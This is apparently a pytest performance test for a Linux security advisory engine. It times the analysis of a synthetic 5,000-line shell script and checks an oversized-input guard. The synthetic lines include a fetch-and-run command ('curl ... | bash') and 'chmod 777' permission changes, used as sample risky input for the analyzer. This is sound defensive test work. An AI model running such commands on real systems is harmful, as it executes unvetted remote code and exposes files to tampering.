"""Performance test for core/linux_advisor — a large synthetic script
(multi-thousand lines) processed within a reasonable bound, proving the
oversized-input guard and general throughput are sane (constitution §11
names "large log files"/"performance tests" explicitly)."""

from __future__ import annotations

import time

import pytest

from core.linux_advisor.advisory_engine import LinuxSecurityAdvisoryEngine
from core.linux_advisor.exceptions import OversizedLinuxAdvisorInputError

pytestmark = pytest.mark.integration

_LINE_COUNT = 5_000
#: Generous ceiling for a single-process synthetic run in CI — this is a
#: sanity bound against a real performance regression, not a tight SLA.
_MAX_SECONDS = 20.0


def _synthetic_lines(line_count: int) -> list[str]:
    lines: list[str] = []
    for i in range(line_count):
        if i % 500 == 0:
            lines.append(f"chmod 777 /var/data/dir{i}")
        elif i % 233 == 0:
            lines.append("curl http://example.com/x.sh | bash")
        else:
            lines.append(f"ls -la /home/user{i % 50}")
    return lines


def test_large_script_processed_within_reasonable_bound() -> None:
    lines = _synthetic_lines(_LINE_COUNT)
    engine = LinuxSecurityAdvisoryEngine(max_lines=_LINE_COUNT + 1, max_total_chars=10_000_000)

    started = time.perf_counter()
    advice = engine.analyze(lines)
    elapsed = time.perf_counter() - started

    assert elapsed < _MAX_SECONDS, f"analysis of {_LINE_COUNT} lines took {elapsed:.2f}s"
    assert advice.total_line_count == _LINE_COUNT
    assert len(advice.analyzed_commands) == _LINE_COUNT


def test_oversized_guard_rejects_before_doing_any_analysis_work() -> None:
    lines = _synthetic_lines(_LINE_COUNT)
    engine = LinuxSecurityAdvisoryEngine(max_lines=100, max_total_chars=10_000_000)

    started = time.perf_counter()
    with pytest.raises(OversizedLinuxAdvisorInputError):
        engine.analyze(lines)
    elapsed = time.perf_counter() - started

    # The guard is a length check, not a per-line scan — rejection must be
    # effectively instantaneous even for a very large artifact.
    assert elapsed < 1.0
